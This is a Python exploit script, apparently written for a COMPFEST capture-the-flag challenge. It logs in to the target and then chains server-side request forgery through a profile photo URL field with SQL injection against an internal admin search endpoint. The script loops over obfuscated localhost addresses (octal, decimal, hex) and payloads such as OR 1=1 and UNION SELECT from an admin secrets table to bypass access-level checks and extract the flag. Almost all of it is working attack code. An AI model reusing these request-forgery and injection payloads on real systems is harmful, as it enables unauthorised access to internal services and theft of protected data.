#!/usr/bin/env python3
import requests
import urllib.parse

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_and_login():
    """Register a new user and login"""
    username = "hacker3"
    password = "hacker123"
    
    # Register
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    # Login
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        return response.cookies
    return None

def exploit():
    """Final exploit focusing on the specific SQL injection bypass"""
    print("[+] Dark Side of Asteroid - Final Exploit")
    print("[+] ====================================")
    
    # Get session
    cookies = register_and_login()
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print("[+] Successfully logged in!")
    
    # The key insight: We need to bypass the access_level <= 2 restriction
    # The SQL injection is in: WHERE secret_name LIKE '{search}' AND access_level <= 2
    # We need to inject something that removes or modifies the access_level restriction
    
    # Method 1: Try to comment out the access_level restriction
    sql_payloads = [
        # Try to comment out the AND access_level <= 2 part
        "access_level'--",
        "access_level'/*",
        "access_level'/**/",
        # Try to inject OR to bypass the restriction
        "access_level' OR '1'='1'--",
        "access_level' OR 1=1--",
        # Try to inject UNION to get all secrets
        "access_level' UNION SELECT secret_name,secret_value FROM admin_secrets--",
        "access_level' UNION SELECT secret_name,secret_value FROM admin_secrets WHERE access_level=3--",
        # Try to inject OR to modify the access_level condition
        "access_level' OR access_level=3--",
        "access_level' OR access_level>2--",
        "access_level' OR access_level>=3--",
        # Try to inject AND to modify the condition
        "access_level' AND access_level=3--",
        "access_level' AND access_level>2--",
        # Try to inject OR to bypass the LIKE clause entirely
        "access_level' OR secret_name LIKE '%'--",
        "access_level' OR 1=1 OR secret_name LIKE '%'--",
    ]
    
    # Try different localhost representations
    localhost_urls = [
        "http://127.0.0.1:5000/internal/admin/search",
        "http://localhost:5000/internal/admin/search",
        "http://0.0.0.0:5000/internal/admin/search",
        "http://0177.0.0.1:5000/internal/admin/search",  # Octal
        "http://2130706433:5000/internal/admin/search",  # Decimal
        "http://0x7f.0x0.0x0.0x1:5000/internal/admin/search",  # Hex
        "http://017700000001:5000/internal/admin/search",  # Combined octal
        "http://127.1:5000/internal/admin/search",  # Shortened
        "http://127.0.1:5000/internal/admin/search",  # Alternative
    ]
    
    print("[+] Testing SQL injection bypasses...")
    
    for base_url in localhost_urls:
        print(f"[*] Trying base URL: {base_url}")
        
        for sql_payload in sql_payloads:
            full_url = f"{base_url}?q={urllib.parse.quote(sql_payload)}"
            
            print(f"[*] Testing: {full_url}")
            
            data = {'photo_url': full_url}
            
            try:
                response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
                
                if response.status_code == 200:
                    # Check for flag in response
                    if "COMPFEST" in response.text:
                        print(f"[+] SUCCESS! Found flag!")
                        print(f"[+] Response: {response.text}")
                        return
                    
                    # Check error preview
                    if "Failed to render as image" in response.text:
                        start = response.text.find("<pre>")
                        end = response.text.find("</pre>")
                        if start != -1 and end != -1:
                            preview = response.text[start+5:end]
                            if "COMPFEST" in preview or "Flag" in preview:
                                print(f"[+] SUCCESS! Found flag in error preview!")
                                print(f"[+] Preview: {preview}")
                                return
                            elif "Access denied" not in preview and "Error" not in preview:
                                print(f"[+] Got interesting response: {preview[:200]}")
                
            except Exception as e:
                print(f"[-] Error: {e}")
                continue
    
    print("[-] SQL injection attempts failed. Trying alternative approaches...")
    
    # Method 2: Try to exploit the empty query case
    # When q='', it shows secrets with access_level <= 2
    # Maybe we can find a way to trigger this
    
    print("[+] Trying empty query exploit...")
    
    for base_url in localhost_urls:
        full_url = f"{base_url}?q="
        
        data = {'photo_url': full_url}
        
        try:
            response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
            
            if response.status_code == 200:
                if "COMPFEST" in response.text:
                    print(f"[+] SUCCESS with empty query!")
                    print(f"[+] Response: {response.text}")
                    return
                
                if "Failed to render as image" in response.text:
                    start = response.text.find("<pre>")
                    end = response.text.find("</pre>")
                    if start != -1 and end != -1:
                        preview = response.text[start+5:end]
                        if "COMPFEST" in preview or "Flag" in preview:
                            print(f"[+] SUCCESS! Found flag in error preview!")
                            print(f"[+] Preview: {preview}")
                            return
                        elif "Access denied" not in preview and "Error" not in preview:
                            print(f"[+] Got interesting response: {preview[:200]}")
        
        except Exception as e:
            continue
    
    print("[-] All attempts failed.")

if __name__ == "__main__":
    exploit()
